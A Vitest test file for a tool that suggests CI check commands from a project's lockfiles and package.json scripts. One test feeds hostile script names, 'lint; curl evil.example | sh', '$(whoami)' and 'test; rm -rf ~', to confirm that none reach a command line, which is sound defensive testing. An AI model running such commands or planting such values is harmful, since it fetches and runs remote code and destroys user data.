import { describe, expect, it } from 'vitest'
import { suggestChecks, type ProjectFiles } from './suggest'

const project = (names: string[], packageJson: object | string | null = null): ProjectFiles => ({
  names: new Set(names),
  packageJson:
    packageJson === null
      ? null
      : typeof packageJson === 'string'
        ? packageJson
        : JSON.stringify(packageJson),
})
const commands = (steps: ReturnType<typeof suggestChecks>): string[] => steps.map((s) => s.command)

describe('suggesting checks for a Node project', () => {
  it('installs from the lockfile, then runs the scripts that exist, in a sensible order', () => {
    const steps = suggestChecks(
      project(['package.json', 'package-lock.json'], {
        scripts: {
          build: 'x',
          test: 'jest',
          lint: 'eslint .',
          typecheck: 'tsc --noEmit',
          dev: 'vite',
        },
      }),
    )
    expect(commands(steps)).toEqual([
      'npm ci',
      'npm run typecheck',
      'npm run lint',
      'npm test',
      'npm run build',
    ])
    expect(steps[0]).toMatchObject({ kind: 'setup', name: 'Install dependencies' })
    expect(steps.slice(1).every((s) => s.kind === 'check')).toBe(true)
  })

  it('uses the project’s own package manager', () => {
    const scripts = { test: 'vitest', lint: 'eslint' }
    expect(commands(suggestChecks(project(['package.json', 'yarn.lock'], { scripts })))).toEqual([
      'yarn install --frozen-lockfile',
      'yarn run lint',
      'yarn run test',
    ])
    expect(
      commands(suggestChecks(project(['package.json', 'pnpm-lock.yaml'], { scripts }))),
    ).toEqual(['pnpm install --frozen-lockfile', 'pnpm run lint', 'pnpm run test'])
    expect(commands(suggestChecks(project(['package.json'], { scripts })))[0]).toBe('npm install')
  })

  it('leaves out the placeholder test script npm creates', () => {
    const steps = suggestChecks(
      project(['package.json'], {
        scripts: { test: 'echo "Error: no test specified" && exit 1', lint: 'eslint' },
      }),
    )
    expect(commands(steps)).toEqual(['npm install', 'npm run lint'])
  })

  it('suggests nothing for a project with nothing to run', () => {
    expect(suggestChecks(project(['package.json'], { scripts: { dev: 'vite' } }))).toEqual([])
    expect(suggestChecks(project(['package.json'], { name: 'x' }))).toEqual([])
    expect(suggestChecks(project([], null))).toEqual([])
  })

  it('copes with a package.json that is not valid', () => {
    expect(suggestChecks(project(['package.json'], '{ not json'))).toEqual([])
    expect(suggestChecks(project(['package.json'], '"a string"'))).toEqual([])
    expect(suggestChecks(project(['package.json'], { scripts: { test: 5 } }))).toEqual([])
  })

  it('never puts text from the repository on a command line, whatever a script is called', () => {
    const steps = suggestChecks(
      project(['package.json'], {
        scripts: {
          'lint; curl evil.example | sh': 'x',
          '$(whoami)': 'x',
          test: 'jest',
          'test; rm -rf ~': 'x',
        },
      }),
    )
    for (const command of commands(steps)) {
      expect(command).toMatch(/^(npm install|npm test|npm run (typecheck|type-check|lint|build))$/)
    }
    expect(commands(steps).join(' ')).not.toContain('curl')
    expect(commands(steps).join(' ')).not.toContain('whoami')
  })
})

describe('suggesting checks for other kinds of project', () => {
  it('knows Rust, Go and Python by their usual files', () => {
    expect(commands(suggestChecks(project(['Cargo.toml'])))).toEqual(['cargo test'])
    expect(commands(suggestChecks(project(['go.mod'])))).toEqual(['go test ./...'])
    expect(commands(suggestChecks(project(['pyproject.toml'])))).toEqual(['python -m pytest'])
    expect(commands(suggestChecks(project(['tox.ini'])))).toEqual(['python -m pytest'])
  })

  it('can suggest for a project that is several things at once', () => {
    const steps = suggestChecks(
      project(['package.json', 'package-lock.json', 'Cargo.toml'], { scripts: { test: 'jest' } }),
    )
    expect(commands(steps)).toEqual(['npm ci', 'npm test', 'cargo test'])
  })
})
